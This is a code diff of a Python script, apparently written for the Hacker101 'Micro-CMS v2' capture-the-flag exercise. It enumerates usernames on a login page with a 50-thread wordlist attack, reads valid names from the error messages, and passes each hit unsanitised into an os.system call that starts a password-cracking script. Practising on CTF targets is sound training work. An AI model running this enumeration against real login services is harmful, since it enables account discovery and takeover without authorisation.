@@ -1,28 +1,30 @@
 import requests
-from time import sleep
 import threading
+from collections import deque
 import os
 
+thread_count = 50
 
-def check_username(username, url):
-    global found
-    data = {"username": username, "password": "password"}
-    response = requests.post(url, data=data)
-    if "Invalid password" in response.text:
-        print(f"Username found: {username}")
-        found = True
-        os.system("python Micro-CMSv2_password.py " + username)
-    else:
-        print(f"Incorrect username: {username}")
+def check_username(q, url):
+    while q:
+        username = q.popleft()
+        data = {"username": username, "password": "password"}
+        response = requests.post(url, data=data)
+        if "Unknown" not in response.text:  # Response text can be different, check the response and change before running the script.
+            print(f"Username found: {username}")
+            os.system("python Micro-CMSv2_password.py " + username) # Run the password script when username is found
+        else:
+            print(f"Incorrect username: {username}")
 
-found = False
-threads = []
-url = "https://{id}.ctf.hacker101.com/login"
+url = "https://ID.ctf.hacker101.com/login" # Change to your URL
+# Username and password will be different for each person. This list might not work for everyone.
 username_file = open("lists/names.txt", "r")
-for name in username_file.readlines():
-    if found:
-        break
-    if threading.active_count() > 50:
-        sleep(1)
-    threading.Thread(target=check_username, args=(name.strip(), url)).start()
-    sleep(0.01)
+q = deque()
+for name in username_file.readlines():  
+    q.append(name)
+
+for i in range(thread_count):
+    threading.Thread(target=check_username, args=(q, url)).start()
+
+    
+
